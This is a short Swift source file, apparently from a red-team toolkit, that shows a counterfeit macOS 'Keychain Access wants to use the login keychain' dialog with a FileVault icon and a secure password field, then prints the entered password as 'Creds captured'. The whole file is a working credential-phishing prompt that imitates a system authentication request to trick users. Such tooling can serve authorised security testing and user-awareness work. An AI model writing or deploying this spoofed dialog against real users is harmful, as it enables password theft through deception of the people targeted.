// @nolint
/*
 Copyright © 2023-present, Meta Platforms, Inc. and affiliates
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in
 all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 THE SOFTWARE.
*/

import Foundation
import Cocoa

let application = NSApplication.shared
application.setActivationPolicy(.regular)
application.activate(ignoringOtherApps: true)

let alert = NSAlert()
alert.window.title = "Authentication Needed"
alert.messageText = "Keychain Access wants to use the login keychain"
alert.informativeText = "Please enter the keychain password."
alert.addButton(withTitle:"OK")
alert.addButton(withTitle:"Cancel")
let iconPath = "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FileVaultIcon.icns"
let iconImg = NSImage(contentsOfFile: iconPath)
alert.icon = iconImg

let passfield = NSSecureTextField(frame: NSRect(x: 0, y: 0, width: 300, height: 24))
alert.accessoryView = passfield

let response = alert.runModal()
if response == NSApplication.ModalResponse.alertFirstButtonReturn{
      print("Creds captured: " + passfield.stringValue)

    } else {

      print("Cancel button clicked. Creds not captured.")

    }
